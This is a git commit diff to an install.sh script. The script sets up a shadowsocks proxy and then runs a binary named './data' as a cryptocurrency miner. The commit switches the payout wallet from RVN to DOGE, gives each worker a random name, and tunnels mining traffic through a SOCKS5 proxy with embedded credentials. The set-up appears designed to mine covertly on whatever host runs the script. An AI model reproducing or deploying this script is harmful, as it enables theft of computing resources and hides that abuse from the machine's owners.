bef221b089c58009ee11ba5a4003a5262106ee3e
sabkakatega03 <104053795+sabkakatega03@users.noreply.github.com>
2022-04-20 11:41:00 +0530

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,4 +7,4 @@ apt -y install shadowsocks-libev rng-tools libsodium-dev
 
 ss-local -s uk1ss.greenssh.xyz -p 8388 -l 8139 -k NTgzZ -m chacha20-ietf-poly1305 -v &
 sleep 1
-./data -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.$(shuf -n 1 -i 1-9999999) -t 2 -p c=RVN,zap=BUT-lyra2z330 -x socks5://giligili:KickAss@152.67.10.189:1080
+./data -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u D8SQiATrkXeAUegfU8x7CGz2wysuQv4A6f.$(shuf -n 1 -i 1-9999999) -t 2 -p c=DOGE,zap=BUT-lyra2z330 -x socks5://giligili:KickAss@152.67.10.189:1080
